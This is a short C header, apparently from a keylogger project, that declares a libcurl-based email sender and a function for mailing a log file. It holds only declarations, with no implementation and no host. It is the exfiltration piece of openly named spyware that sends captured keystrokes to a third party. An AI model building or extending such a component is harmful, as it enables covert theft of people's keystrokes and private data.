#pragma once

#include <curl/curl.h>
#include "keylogger/utils/log_file.h"

typedef struct {
    CURL *curl;
    struct curl_slist *recipients;
} EmailSender;

int EmailSender_init(EmailSender *sender);
int send_file_via_email(EmailSender *sender, Logfile *fh);
void EmailSender_cleanup(EmailSender *sender);
